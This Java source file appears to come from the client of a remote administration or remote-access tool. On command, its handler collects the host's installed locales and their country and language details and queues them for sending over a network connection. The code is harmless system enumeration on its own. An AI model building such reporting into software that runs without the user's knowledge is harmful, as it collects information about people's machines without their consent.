package com.redpois0n.packets;

import java.util.Locale;

import com.redpois0n.Connection;

public class PacketLOCALES extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		PacketBuilder packet = new PacketBuilder(Header.INSTALLED_LOCALES);
		
		Locale[] installed = Locale.getAvailableLocales();
		packet.add(installed.length);
		
		for (int i = 0; i < installed.length; i++) {
			Locale locale = installed[i];
			packet.add(locale.getCountry());
			packet.add(locale.getDisplayCountry());
			packet.add(locale.getLanguage().toUpperCase());
			packet.add(locale.getDisplayLanguage());
		}
		
		Connection.addToSendQueue(packet);
		
	}

}
